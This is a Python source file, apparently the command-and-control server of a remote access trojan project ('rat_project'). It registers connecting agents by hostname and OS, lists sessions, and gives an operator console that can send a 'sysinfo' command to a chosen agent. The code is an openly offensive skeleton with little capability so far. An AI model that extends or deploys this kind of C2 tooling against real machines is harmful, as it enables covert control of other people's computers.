import socket
import threading
from typing import Any

from rat_project.common.protocol import decode_message, encode_message
from rat_project.utils.logger_config import setup_logger

HOST = "127.0.0.1"
PORT = 8888

logger = setup_logger("server")

sessions: dict[int, dict[str, Any]] = {}
session_lock = threading.Lock()
session_counter = 0
current_session_id: int | None = None


def register_session(conn: socket.socket, addr: tuple[str, int], payload: dict[str, Any]) -> int:
    global session_counter

    with session_lock:
        session_counter += 1
        session_id = session_counter
        sessions[session_id] = {
            "conn": conn,
            "ip": addr[0],
            "port": addr[1],
            "hostname": payload.get("hostname", "unknown"),
            "os": payload.get("os", "unknown"),
            "release": payload.get("release", "unknown"),
        }

    return session_id


def remove_session(session_id: int) -> None:
    with session_lock:
        if session_id in sessions:
            del sessions[session_id]


def list_sessions() -> None:
    with session_lock:
        if not sessions:
            logger.info("No active sessions")
            return

        logger.info("Active sessions:")
        for session_id, session_data in sessions.items():
            logger.info(
                "Session %s | %s:%s | %s | %s %s",
                session_id,
                session_data["ip"],
                session_data["port"],
                session_data["hostname"],
                session_data["os"],
                session_data["release"],
            )


def get_session(session_id: int) -> dict[str, Any] | None:
    with session_lock:
        return sessions.get(session_id)


def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
    session_id = None

    try:
        logger.info("Client connected from %s:%s", addr[0], addr[1])

        data = conn.recv(4096)
        payload = decode_message(data)

        if payload.get("type") != "register":
            logger.warning("Invalid first message from %s:%s", addr[0], addr[1])
            conn.sendall(encode_message({"type": "error", "message": "first message must be register"}))
            return

        session_id = register_session(conn, addr, payload)

        logger.info(
            "Session %s registered: %s (%s %s)",
            session_id,
            payload.get("hostname"),
            payload.get("os"),
            payload.get("release"),
        )

        conn.sendall(
            encode_message(
                {
                    "type": "ack",
                    "message": f"session {session_id} registered",
                    "session_id": session_id,
                }
            )
        )

        list_sessions()

        while True:
            data = conn.recv(4096)
            if not data:
                break

    except Exception as exc:
        logger.exception("Error while handling client %s:%s: %s", addr[0], addr[1], exc)

    finally:
        if session_id is not None:
            remove_session(session_id)
            logger.info("Session %s disconnected", session_id)

        conn.close()


def accept_clients(server_socket: socket.socket) -> None:
    while True:
        conn, addr = server_socket.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        thread.start()


def interact_with_session(session_id: int) -> None:
    session = get_session(session_id)

    if session is None:
        logger.info("Session %s not found", session_id)
        return

    conn = session["conn"]

    while True:
        command = input(f"rat agent {session_id} > ").strip()

        if command == "back":
            break

        if command == "help":
            print("Available agent commands:")
            print("  sysinfo   - get OS-specific system information")
            print("  back      - return to main console")
            continue

        if command == "sysinfo":
            conn.sendall(encode_message({"type": "command", "command": "sysinfo"}))
            data = conn.recv(65536)
            response = decode_message(data)
            print(response.get("output", "No output received"))
            continue

        print("Unknown command. Type 'help'.")


def command_loop() -> None:
    while True:
        try:
            command = input("rat > ").strip()

            if command == "help":
                print("Available commands:")
                print("  help            - show commands")
                print("  sessions        - list active sessions")
                print("  interact <id>   - interact with a session")
                print("  exit            - stop server")

            elif command == "sessions":
                list_sessions()

            elif command.startswith("interact "):
                _, session_id_str = command.split(maxsplit=1)

                if not session_id_str.isdigit():
                    print("Session id must be a number")
                    continue

                interact_with_session(int(session_id_str))

            elif command == "exit":
                print("Stopping server...")
                break

            else:
                print("Unknown command. Type 'help'.")

        except KeyboardInterrupt:
            print("\nStopping server...")
            break


def run_server() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)

        logger.info("Server listening on %s:%s", HOST, PORT)

        accept_thread = threading.Thread(
            target=accept_clients,
            args=(server_socket,),
            daemon=True,
        )
        accept_thread.start()

        command_loop()


if __name__ == "__main__":
    run_server()
